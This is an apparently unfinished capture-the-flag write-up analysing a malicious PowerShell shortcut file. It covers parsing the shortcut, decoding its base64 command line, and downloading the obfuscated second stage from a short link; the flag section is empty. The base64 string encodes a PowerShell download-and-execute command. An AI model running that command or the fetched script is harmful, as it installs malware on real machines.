# Russian Roulette

## Steps
```bash
wget https://huntress.ctf.games/files/829e33270cc252cc044abf32a4a61cac/russian_roulette.zip
7z x -prussian_roulette russian_roulette.zip

# we get a powershell lnk file, determined using file
file Windows\ PowerShell.lnk

# use a tool called LnkParse3 to try to process what it does without running it
# see https://github.com/Matmaus/LnkParse3 or pip install it
lnkparse Windows\ PowerShell.lnk > lnkparse_out.txt

# the cmdline args is a b64 string, decode
echo -n "aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=" | base64 -d > cmdline_b64_decoded.txt

# did a dig to see if is.gd url resolves, returns some IPs it's a URL shortener
dig is.gd 

# pull the file it wants to execute, it's a script probably batch but obsfuscated
wget is.gd/jwr7JD

# re-open the file with utf8 encoding, can see it's russian and try to reverse

# continue later

```

## Flag
```

```